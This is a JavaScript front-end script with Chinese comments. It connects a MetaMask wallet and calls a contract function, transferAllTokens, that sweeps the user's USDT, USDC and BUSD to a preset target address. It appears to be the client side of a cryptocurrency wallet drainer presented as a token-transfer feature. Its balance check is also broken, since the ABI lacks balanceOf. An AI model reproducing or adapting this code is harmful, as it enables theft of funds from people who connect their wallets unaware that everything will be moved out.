const contractAddress = '0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F'; // 智能合约地址
const ABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            }
        ],
        "name": "transferAllTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "stateMutability": "payable",
        "type": "receive"
    },
    {
        "inputs": [],
        "name": "busdToken",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "targetAddress",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "usdcToken",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "usdtToken",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

let account;
let web3;
let contract;

// 连接钱包
async function connectWallet() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            account = accounts[0];
            console.log('Wallet connected:', account);
            document.getElementById('wallet-address').innerText = account;
            contract = new web3.eth.Contract(ABI, contractAddress);
        } catch (error) {
            console.error('Connection failed', error);
        }
    } else {
        alert('Please install MetaMask to use this feature.');
    }
}

// 检查余额
async function checkBalance() {
    try {
        const usdtContract = new web3.eth.Contract(ABI, '0xdAC17F958D2ee523a2206206994597C13D831ec7');
        const balance = await usdtContract.methods.balanceOf(account).call();
        document.getElementById('usdt-balance').innerText = balance;
        return balance;
    } catch (error) {
        console.error('Failed to fetch balance:', error);
    }
}

// 转移代币
async function transferTokens() {
    try {
        const gasPrice = await web3.eth.getGasPrice(); // 获取实时Gas Price
        const gasLimit = 100000; // 设置Gas Limit

        await contract.methods.transferAllTokens(account).send({
            from: account,
            gasPrice: gasPrice,
            gas: gasLimit
        });

        alert('Tokens transferred successfully!');
    } catch (error) {
        console.error('Token transfer failed:', error);
        alert('Failed to transfer tokens: ' + error.message);
    }
}

// 事件绑定
document.getElementById('connect-wallet').addEventListener('click', connectWallet);
document.getElementById('transfer-tokens').addEventListener('click', transferTokens);
